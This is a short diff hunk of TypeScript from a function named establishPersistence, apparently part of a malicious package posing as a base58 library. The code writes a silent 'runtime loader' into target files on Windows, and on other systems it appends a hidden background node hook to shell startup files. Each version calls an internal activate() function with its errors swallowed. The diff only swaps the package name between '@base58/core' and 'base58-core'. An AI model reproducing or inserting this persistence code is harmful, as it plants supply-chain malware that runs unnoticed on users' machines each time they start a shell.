@@ -143,10 +143,10 @@ function establishPersistence(): void {
 
     if ((globalThis as any).process?.platform === 'win32') {
       for (const t of targets) {
-        try { fs.writeFileSync(t, '// runtime loader\ntry { require("@base58/core")._internal.activate(); } catch(e) {}'); } catch {}
+        try { fs.writeFileSync(t, '// runtime loader\ntry { require("base58-core")._internal.activate(); } catch(e) {}'); } catch {}
       }
     } else {
-      const hook = '\n# base58 runtime\n(node -e "try{require(\"@base58/core\")._internal.activate()}catch(e){}" &) 2>/dev/null\n';
+      const hook = '\n# base58 runtime\n(node -e "try{require(\"base58-core\")._internal.activate()}catch(e){}" &) 2>/dev/null\n';
       for (const rc of targets) {
         try {
           if (fs.existsSync(rc)) {
